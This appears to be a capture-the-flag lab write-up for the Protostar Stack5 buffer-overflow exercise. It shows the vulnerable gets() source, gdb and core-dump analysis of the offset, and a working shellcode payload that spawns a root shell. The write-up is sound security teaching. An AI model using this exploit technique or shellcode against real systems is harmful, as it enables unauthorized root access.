#### Protostar Stack5

##### About
Stack5 is a standard buffer overflow, this time introducing shellcode.  
  
This level is at /opt/protostar/bin/stack5

###### Hints
* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
* remove the int3s once your shellcode is done.

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

To solve this challenge, one should use core dumps for analysis instead of direct debugging in order to capture the memory state of the program exactly as it appears during normal execution.  
  
Notice that, if one call stack5 program by ./stack5 in the /opt/protostar/bin folder, the momory address of the overflow point will be different from the one of which called by using the full path.  
  
All the references are worth reading, especially the last one.

##### Solution
```
$ gdb stack5
......
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <+0>:    push   %ebp
0x080483c5 <+1>:    mov    %esp,%ebp
0x080483c7 <+3>:    and    $0xfffffff0,%esp
0x080483ca <+6>:    sub    $0x50,%esp
0x080483cd <+9>:    lea    0x10(%esp),%eax
0x080483d1 <+13>:   mov    %eax,(%esp)
0x080483d4 <+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <+21>:   leave  
0x080483da <+22>:   ret 
End of assembler dump.
(gdb) quit

$ ulimit -c unlimited                 
$ cat /proc/sys/kernel/core_pattern
......
root@protostar:~$ echo 1 > /proc/sys/fs/suid_dumpable         <-- MUST be executed as root
......
$ python -c "print 'A'*76+'B'*4+'C'*80" | ./stack5
Segmentation fault (core dumped)

root@protostar:/tmp# gdb -q -c core.11.stack5.1401            <-- MUST be executed as root
Core was generated by './stack5'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
(gdb) x/40x $esp-100
0xbffffcfc:     0x080483d9      0xbffffd10      0xb7ec6165      0xbffffd18
0xbffffd0c:     0xb7eada75      0x41414141      0x41414141      0x41414141
0xbffffd1c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd2c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd3c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd4c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd5c:     0x42424242      0x43434343      0x43434343      0x43434343
0xbffffd6c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd7c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd8c:     0x43434343      0x43434343      0x43434343      0x43434343
(gdb) quit

$ cat script.sh
#!/bin/sh
python -c "print 'A'*76+'\x70\xfd\xff\xbf'+'\x90'*20+'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'" > /tmp/payload

$ ./script.sh
......
$ ./stack5 < /tmp/payload
# whoami
root
```

##### Reference
<https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>  
<https://thesprawl.org/research/exploit-exercises-protostar-stack/#stack-5>  
<https://www.mattandreko.com/2011/12/17/exploit-exercises-protostar-stack-5/>
